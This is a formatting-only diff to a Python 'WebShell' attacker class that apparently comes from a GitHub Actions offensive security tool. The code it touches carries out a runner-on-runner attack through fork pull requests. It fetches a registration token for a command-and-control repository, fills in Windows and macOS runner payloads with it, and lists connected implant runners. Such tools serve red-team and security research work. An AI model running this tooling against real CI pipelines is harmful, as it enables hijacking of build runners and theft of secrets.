@@ -131,7 +131,7 @@ class WebShell(Attacker):
         yaml_name: str = "tests",
         workflow_name: str = "Testing",
         run_name: str = "Testing",
-        c2_repo: str = None
+        c2_repo: str = None,
     ):
         """Performs a runner-on-runner attack using the fork pull request technique.
 
@@ -414,7 +414,7 @@ class WebShell(Attacker):
                 f"/repos/{c2_repo}/actions/runners/registration-token"
             )
             if token_resp.status_code == 201:
-                registration_token = token_resp.json()["token"] 
+                registration_token = token_resp.json()["token"]
             else:
                 Output.error(f"Unable to retrieve registration token for {c2_repo}!")
                 return None
@@ -431,12 +431,12 @@ class WebShell(Attacker):
                 )
             elif target_os == "win":
                 return Payloads.ROR_GIST_WINDOWS.format(
-                    registration_token, 
+                    registration_token,
                     c2_repo,
                     release_file,
-                    name, 
+                    name,
                     "true" if keep_alive else "false",
-                    random_name
+                    random_name,
                 )
             elif target_os == "osx":
                 return Payloads.ROR_GIST_MACOS.format(
@@ -450,7 +450,6 @@ class WebShell(Attacker):
         else:
             Output.error("Unable to retrieve runner version!")
             return None
-
 
     def issue_command(
         self,
@@ -589,8 +588,12 @@ class WebShell(Attacker):
             for runner in runners:
                 runner_name = runner["name"]
 
-                labels = ", ".join([Output.yellow(label["name"]) for label in runner["labels"]])
+                labels = ", ".join(
+                    [Output.yellow(label["name"]) for label in runner["labels"]]
+                )
                 status = runner["status"]
-                Output.tabbed(f"Name: {Output.red(runner_name)} - Labels: {labels} - Status: {Output.bright(status)}")
+                Output.tabbed(
+                    f"Name: {Output.red(runner_name)} - Labels: {labels} - Status: {Output.bright(status)}"
+                )
         else:
             Output.error("No runners connected to C2 repository!")
